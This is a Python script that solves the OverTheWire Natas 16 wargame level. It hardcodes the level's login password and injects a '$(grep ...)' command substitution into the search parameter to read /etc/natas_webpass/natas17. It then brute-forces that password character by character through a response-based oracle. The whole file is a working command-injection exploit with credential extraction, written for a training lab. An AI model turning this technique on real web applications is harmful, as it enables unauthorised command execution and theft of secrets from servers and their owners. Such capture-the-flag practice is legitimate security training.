import string
import requests
from requests.auth import HTTPBasicAuth

# Credentials and URL for Natas 16
username = "natas16"
password_natas16 = "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"  # Replace with your current password if needed
url = f"http://{username}.natas.labs.overthewire.org/"
auth = HTTPBasicAuth(username, password_natas16)

# Character set to test (lowercase, uppercase, numbers)
charset = string.ascii_letters + string.digits
found_password = ""

print("[*] Brute-forcing Natas 17 password...")

for i in range(32):  # Natas passwords are typically 32 characters long
    found_char = False
    for c in charset:
        # Test each character using the grep prefix trick with a common dictionary word ('astronomy')
        payload = f"$(grep ^{found_password + c} /etc/natas_webpass/natas17)astronomy"
        
        response = requests.get(url, params={"needle": payload}, auth=auth)
        
        # If 'astronomy' is NOT in the response, it means the grep matched (character is correct!)
        if "astronomy" not in response.text:
            found_password += c
            print(f"[+] Progress: {found_password}")
            found_char = True
            break
            
    if not found_char:
        print("[-] Reached end of password or no match found.")
        break

print(f"\n[+] Final Natas 17 Password: {found_password}")